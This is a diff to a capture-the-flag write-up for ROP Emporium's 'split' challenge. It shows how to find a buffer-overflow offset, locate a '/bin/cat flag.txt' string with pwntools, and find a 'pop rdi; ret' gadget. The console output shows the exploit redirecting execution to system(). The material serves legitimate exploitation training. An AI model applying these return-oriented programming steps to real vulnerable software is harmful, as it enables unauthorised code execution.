@@ -48,7 +48,9 @@ void usefulFunction(void)
 }
 ```
 
-We need to exploit the buffer overflow in pwnme() to run usefulFunction().
+In the description of the challenge, we're told there is a "/bin/cat flag.txt" string in the binary.  
+  
+We need to exploit the buffer overflow in pwnme(), to run the system call in usefulFunction() with the "/bin/cat flag.txt" string as parameter.
 
 # Dynamic analysis
 
@@ -114,6 +116,76 @@ $cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
-We can see that the rbp is stored right after the variable : our payload will have an offset of 32 bytes, 8 bytes to overwrite the rbp, and finally the address of ret2win.
+We can see that the rbp is stored right after the variable : our payload will have an offset of 32 bytes.  
+  
+Let's find the "/bin/cat flag.txt" string using pwntool :
+
+```python
+from pwn import *
+
+binary = ELF("./split")
+string = next(binary.search(b"/bin/cat"))
+
+print(string)
+```
+
+```console
+$ python3 cat.py    
+[*] '/home/coucou/Documents/ROP_Emporium/02_split/split'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+6295648
+```
+
+```gdb
+gef➤  x/s 6295648
+0x601060 <usefulString>:	"/bin/cat flag.txt"
+```
+
+Finally to run the system call with another argument we need to modify the rdi, let's find a gadget to do so :
+
+```console
+$ ROPgadget --binary split | grep rdi             
+0x0000000000400288 : loope 0x40025a ; sar dword ptr [rdi - 0x5133700c], 0x1d ; retf 0xe99e
+0x00000000004007c3 : pop rdi ; ret
+0x000000000040028a : sar dword ptr [rdi - 0x5133700c], 0x1d ; retf 0xe99e
+```
+
+```gdb
+gef➤  x/2wi 0x00000000004007c3
+   0x4007c3 <__libc_csu_init+99>:	pop    rdi
+   0x4007c4 <__libc_csu_init+100>:	ret
+```
+
+We got all we need, let's write an exploit.
 
 # Exploit
+
+Using [this script](./exploit.py) to send our payload we get this output :
+
+```console
+$ python3 exploit.py 
+[*] '/home/coucou/Documents/ROP_Emporium/02_split/split'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Starting local process '/home/coucou/Documents/ROP_Emporium/02_split/split': pid 27166
+[*] Switching to interactive mode
+split by ROP Emporium
+x86_64
+
+Contriving a reason to ask user for data...
+> Thank you!
+ROPE{a_placeholder_32byte_flag!}
+split by ROP Emporium
+x86_64
+
+Contriving a reason to ask user for data...
+> $ 
+[*] Stopped process '/home/coucou/Documents/ROP_Emporium/02_split/split' (pid 27166)
+```
